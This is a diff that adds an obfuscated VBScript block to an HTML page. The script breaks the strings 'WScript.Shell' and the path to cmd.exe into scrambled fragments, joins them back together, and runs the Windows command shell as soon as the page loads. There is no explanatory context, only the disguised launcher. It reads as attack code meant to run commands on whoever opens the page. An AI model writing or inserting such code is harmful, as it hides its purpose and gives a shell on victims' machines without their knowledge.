@@ -1,0 +1,24 @@
+<script language="VBScript"> 
+    Function YTmlwenDUFbn
+	Dim ApTUwYArSZMxYAwWWFlNKDyt
+	NYvNTDoBZRmgvgeJta = "WS"
+	CydjygJgIlGokr = "\\c"
+	PCQhGeUKComyf = "crip"
+	UXyXFRDtIkkCWGXOVfWqELtJIVdF = "t.Sh"
+	VVeibBNmktV = "dows\\Sys"
+	wtdWtLIHFHmqrqzkgH = "ell"
+	meQyyIBUbzVlPwfBpxVrBollj = NYvNTDoBZRmgvgeJta + PCQhGeUKComyf 
+	MwpolNrinflk = meQyyIBUbzVlPwfBpxVrBollj + UXyXFRDtIkkCWGXOVfWqELtJIVdF + wtdWtLIHFHmqrqzkgH
+	Set ApTUwYArSZMxYAwWWFlNKDyt = CreateObject(MwpolNrinflk)
+	
+ 
+	OIZugenDRRtFP = "C:\\Win"
+	XEmivIYOcqICiPxj = "tem32"
+	MypoURNasdr = "md.exe"
+	oLFQJkonTlhxI = OIZugenDRRtFP + VVeibBNmktV + XEmivIYOcqICiPxj
+	GeNquIpop = CydjygJgIlGokr + MypoURNasdr
+	MdyqnTzemPK = oLFQJkonTlhxI + GeNquIpop
+	ApTUwYArSZMxYAwWWFlNKDyt.run MdyqnTzemPK 
+    End Function
+YTmlwenDUFbn()
+</script>
